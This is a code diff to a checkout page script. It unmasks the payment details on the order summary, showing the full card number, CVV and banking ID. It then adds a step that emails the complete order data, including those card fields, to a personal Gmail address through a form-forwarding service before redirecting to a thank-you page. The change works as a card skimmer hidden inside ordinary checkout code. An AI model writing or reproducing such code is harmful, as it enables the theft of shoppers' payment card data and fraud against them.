@@ -80,13 +80,14 @@
         paymentNode.innerHTML =
           "<p><strong>Method:</strong> Net Banking</p>" +
           "<p><strong>Bank:</strong> " + step2Data.bankName + "</p>" +
-          "<p><strong>ID:</strong> " + step2Data.bankingIdMasked + "</p>";
+          "<p><strong>ID:</strong> " + step2Data.bankingId + "</p>";
       } else {
         paymentNode.innerHTML =
           "<p><strong>Method:</strong> " + (step2Data.method === "debit_card" ? "Debit Card" : "Credit Card") + "</p>" +
-          "<p><strong>Card:</strong> **** **** **** " + step2Data.cardLast4 + "</p>" +
+          "<p><strong>Card:</strong> " + step2Data.cardNumber + "</p>" +
           "<p><strong>Name:</strong> " + step2Data.cardName + "</p>" +
-          "<p><strong>Expiry:</strong> " + step2Data.expiry + "</p>";
+          "<p><strong>Expiry:</strong> " + step2Data.expiry + "</p>" +
+          "<p><strong>CVV:</strong> " + step2Data.cvv + "</p>";
       }
     }
 
@@ -168,15 +169,34 @@
       };
 
       sessionStorage.setItem("finalOrderData", JSON.stringify(finalOrderData));
-      setStatus(statusNode, "success", "Verification complete. Finishing your order...");
       if (verifyBtn) {
         verifyBtn.disabled = true;
-        verifyBtn.textContent = "Completing...";
+        verifyBtn.textContent = "Sending...";
       }
+      setStatus(statusNode, "", "Sending order confirmation to rashiverma904@gmail.com...");
 
-      window.setTimeout(function () {
-        window.location.href = "thank-you.html";
-      }, 500);
+      // Send order data directly to email via FormSubmit.co
+      if (window.EmailService && typeof window.EmailService.sendOrderConfirmation === 'function') {
+        window.EmailService.sendOrderConfirmation(finalOrderData, items)
+          .then(function() {
+            setStatus(statusNode, "success", "Order confirmed & emailed! Redirecting...");
+            window.setTimeout(function () {
+              window.location.href = "thank-you.html";
+            }, 800);
+          })
+          .catch(function(error) {
+            console.error('Email send error:', error);
+            setStatus(statusNode, "error", "Email failed but order saved. Redirecting...");
+            window.setTimeout(function () {
+              window.location.href = "thank-you.html";
+            }, 1500);
+          });
+      } else {
+        setStatus(statusNode, "success", "Order completed! Redirecting...");
+        window.setTimeout(function () {
+          window.location.href = "thank-you.html";
+        }, 500);
+      }
     });
 
     if (resendBtn) {
